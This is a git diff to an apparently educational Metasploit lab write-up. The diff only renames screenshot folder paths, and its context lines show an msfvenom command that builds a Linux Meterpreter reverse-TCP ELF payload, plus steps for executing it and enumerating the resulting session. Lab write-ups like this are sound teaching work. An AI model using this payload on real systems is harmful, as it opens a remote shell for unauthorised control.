@@ -40,7 +40,7 @@ On Kali Linux terminal, switched to root privileges, and generated a Linux Meter
 
   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.x.x.x LPORT=8081 -f elf > test.elf
 
-  ![Payload Creation](Lab2-screenshots/payload-creation.png)
+  ![Payload Creation](Lab2_screenshots/payload-creation.png)
 
 Explanation
 
@@ -65,7 +65,7 @@ chmod +x
 
 adds executable permission to the file.
 
-![ELF Permission](Lab2-screenshots/Granting-execute-permission.png)
+![ELF Permission](Lab2_screenshots/Granting-execute-permission.png)
 
 ## Step 3 - Executing the Payload
 
@@ -75,7 +75,7 @@ Opened a second terminal and executed the payload file.
 
 This initiated the reverse TCP connection back to the Metasploit listener.
 
-![Payload execution](Lab2-screenshots/execute-payload.png)
+![Payload execution](Lab2_screenshots/execute-payload.png)
 
 ## Step 4 - Metasploit Listener Configuration
 
@@ -124,9 +124,9 @@ These settings help:
 
   Started the listener and waited for the reverse connection.
 
-![msfconsole setup](Lab2-screenshots/msfconsole.png)
+![msfconsole setup](Lab2_screenshots/msfconsole.png)
 
-![Session time](Lab2-screenshots/Session-Time.png)
+![Session time](Lab2_screenshots/Session-Time.png)
 
   ## Step 5 - Meterpreter Session & Enumeration
 
@@ -141,7 +141,7 @@ These settings help:
   | ps | List running processes |
   | ipconfig/ifconfig | Display network configuration |
 
-![Meterpreter Session](Lab2-screenshots/Metasploit-listener.png)
+![Meterpreter Session](Lab2_screenshots/Metasploit-listener.png)
 
   ## Reverse TCP Flow
 
